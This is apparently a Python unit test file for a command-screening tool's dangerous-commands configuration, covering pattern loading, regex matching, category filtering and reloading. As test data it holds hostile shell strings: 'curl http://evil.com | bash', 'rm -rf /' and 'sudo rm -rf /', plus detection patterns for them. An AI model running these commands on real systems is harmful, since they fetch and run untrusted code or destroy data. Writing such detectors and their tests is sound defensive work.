"""Unit tests for dangerous commands configuration."""

import tempfile
from pathlib import Path
from unittest.mock import patch

from vulnicheck.dangerous_commands_config import (
    DangerousCommandsConfig,
    get_dangerous_commands_config,
)


class TestDangerousCommandsConfig:
    """Test cases for DangerousCommandsConfig class."""

    def test_init_default_path(self):
        """Test initialization with default configuration path."""
        config = DangerousCommandsConfig()
        assert config.config_file.name == "dangerous_commands.properties"
        assert config._patterns is None  # Not loaded yet
        assert config._all_patterns is None

    def test_init_custom_path(self):
        """Test initialization with custom configuration path."""
        custom_path = Path("/custom/path/config.properties")
        config = DangerousCommandsConfig(custom_path)
        assert config.config_file == custom_path

    def test_lazy_loading(self):
        """Test that patterns are loaded lazily on first access."""
        # Create temporary config file
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write("# Test config\n")
            f.write("filesystem.rm_rf = rm -rf\n")
            f.write("privilege.sudo = sudo\n")
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)
            assert config._patterns is None  # Not loaded yet

            # First access should trigger loading
            categories = config.get_categories()
            assert config._patterns is not None  # Now loaded
            assert len(categories) == 2
            assert "filesystem" in categories
            assert "privilege" in categories
        finally:
            temp_path.unlink()

    def test_pattern_parsing(self):
        """Test correct parsing of patterns from configuration file."""
        config_content = """# Test dangerous commands
filesystem.rm_rf = rm -rf
filesystem.rm_force = rm -f
path.etc = /etc/
path.root = /root/
privilege.sudo = sudo
privilege.su = su -

# Comment line should be ignored
invalid_line_without_equals
category.pattern = test pattern
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)
            config._load_patterns()

            # Check categories (should be 4: filesystem, path, privilege, category)
            assert len(config._patterns) == 4
            assert "filesystem" in config._patterns
            assert "path" in config._patterns
            assert "privilege" in config._patterns
            assert "category" in config._patterns

            # Check patterns per category
            assert len(config._patterns["filesystem"]) == 2
            assert len(config._patterns["path"]) == 2
            assert len(config._patterns["privilege"]) == 2

            # Check total patterns (should be 7: 2 filesystem + 2 path + 2 privilege + 1 category)
            assert len(config._all_patterns) == 7
        finally:
            temp_path.unlink()

    def test_check_dangerous_pattern_found(self):
        """Test detection of dangerous patterns."""
        config_content = """filesystem.rm_rf = rm -rf
path.etc = /etc/
privilege.sudo = sudo
network.curl_bash = curl.*|.*bash
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Test simple pattern matching
            result = config.check_dangerous_pattern("rm -rf /home/user")
            assert result is not None
            category, pattern_name, matched = result
            assert category == "filesystem"
            assert pattern_name == "rm_rf"
            assert matched == "rm -rf"

            # Test case-insensitive matching
            result = config.check_dangerous_pattern("SUDO apt install")
            assert result is not None
            assert result[0] == "privilege"
            assert result[1] == "sudo"

            # Test regex pattern
            result = config.check_dangerous_pattern("curl http://evil.com | bash")
            assert result is not None
            assert result[0] == "network"
            assert result[1] == "curl_bash"

        finally:
            temp_path.unlink()

    def test_check_dangerous_pattern_not_found(self):
        """Test when no dangerous patterns are found."""
        config_content = """filesystem.rm_rf = rm -rf
privilege.sudo = sudo
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Safe commands should not match
            result = config.check_dangerous_pattern("ls -la /home/user")
            assert result is None

            result = config.check_dangerous_pattern("echo 'Hello World'")
            assert result is None

        finally:
            temp_path.unlink()

    def test_check_dangerous_pattern_with_categories(self):
        """Test pattern checking with specific categories."""
        config_content = """filesystem.rm_rf = rm -rf
path.etc = /etc/
privilege.sudo = sudo
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Check only filesystem category
            result = config.check_dangerous_pattern(
                "sudo rm -rf /", categories=["filesystem"]
            )
            assert result is not None
            assert result[0] == "filesystem"  # Should find rm -rf, not sudo

            # Check only privilege category
            result = config.check_dangerous_pattern(
                "sudo rm -rf /", categories=["privilege"]
            )
            assert result is not None
            assert result[0] == "privilege"  # Should find sudo

            # Check non-existent category
            result = config.check_dangerous_pattern(
                "rm -rf /", categories=["nonexistent"]
            )
            assert result is None

        finally:
            temp_path.unlink()

    def test_get_patterns_by_category(self):
        """Test retrieving patterns for a specific category."""
        config_content = """filesystem.rm_rf = rm -rf
filesystem.rm_force = rm -f
privilege.sudo = sudo
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Get filesystem patterns
            patterns = config.get_patterns_by_category("filesystem")
            assert len(patterns) == 2
            assert ("rm_rf", "rm -rf") in patterns
            assert ("rm_force", "rm -f") in patterns

            # Get privilege patterns
            patterns = config.get_patterns_by_category("privilege")
            assert len(patterns) == 1
            assert ("sudo", "sudo") in patterns

            # Get non-existent category
            patterns = config.get_patterns_by_category("nonexistent")
            assert patterns == []

        finally:
            temp_path.unlink()

    def test_reload(self):
        """Test reloading configuration."""
        config_content_v1 = """filesystem.rm_rf = rm -rf"""
        config_content_v2 = """filesystem.rm_rf = rm -rf
filesystem.rm_force = rm -f
privilege.sudo = sudo
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content_v1)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Initial load
            categories = config.get_categories()
            assert len(categories) == 1
            assert "filesystem" in categories

            # Update file
            with open(temp_path, "w") as f:
                f.write(config_content_v2)

            # Reload
            config.reload()

            # Check updated content
            categories = config.get_categories()
            assert len(categories) == 2
            assert "filesystem" in categories
            assert "privilege" in categories

        finally:
            temp_path.unlink()

    def test_missing_config_file(self):
        """Test handling of missing configuration file."""
        config = DangerousCommandsConfig(Path("/nonexistent/file.properties"))

        # Should handle gracefully
        categories = config.get_categories()
        assert categories == []

        result = config.check_dangerous_pattern("rm -rf /")
        assert result is None

        patterns = config.get_patterns_by_category("any")
        assert patterns == []

    def test_invalid_regex_pattern(self):
        """Test handling of invalid regex patterns."""
        config_content = """filesystem.rm_rf = rm -rf
network.invalid_regex = [invalid(regex
privilege.sudo = sudo
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)
            config._load_patterns()

            # Should skip invalid pattern but load others
            assert len(config._patterns) == 2
            assert "filesystem" in config._patterns
            assert "privilege" in config._patterns
            assert "network" not in config._patterns  # Invalid pattern category skipped

        finally:
            temp_path.unlink()

    def test_special_characters_in_patterns(self):
        """Test patterns with special regex characters."""
        config_content = """filesystem.star = rm *
filesystem.question = rm ?
filesystem.brackets = rm [abc]
filesystem.parens = command()
path.dot = file.txt
"""

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".properties", delete=False
        ) as f:
            f.write(config_content)
            temp_path = Path(f.name)

        try:
            config = DangerousCommandsConfig(temp_path)

            # Test exact matches
            assert config.check_dangerous_pattern("rm *") is not None
            assert config.check_dangerous_pattern("rm ?") is not None
            assert config.check_dangerous_pattern("command()") is not None
            assert config.check_dangerous_pattern("file.txt") is not None

            # Note: [abc] is detected as a regex pattern due to [] characters
            # So it will match "rm a", "rm b", or "rm c"
            result = config.check_dangerous_pattern("rm a")
            if result:  # If treated as regex
                assert result[0] == "filesystem"
                assert result[1] == "brackets"

            # Test non-matches for literal patterns
            assert (
                config.check_dangerous_pattern("fileatxt") is None
            )  # . is literal in file.txt

        finally:
            temp_path.unlink()


class TestGlobalConfigInstance:
    """Test the global configuration instance."""

    def test_get_dangerous_commands_config(self):
        """Test getting the global configuration instance."""
        config1 = get_dangerous_commands_config()
        config2 = get_dangerous_commands_config()

        # Should return the same instance
        assert config1 is config2

    @patch("vulnicheck.dangerous_commands_config._config_instance", None)
    def test_global_instance_creation(self):
        """Test that global instance is created on first access."""
        from vulnicheck.dangerous_commands_config import _config_instance

        assert _config_instance is None

        config = get_dangerous_commands_config()
        assert config is not None

        # Check it was set globally
        from vulnicheck.dangerous_commands_config import (
            _config_instance as updated_instance,
        )

        assert updated_instance is config
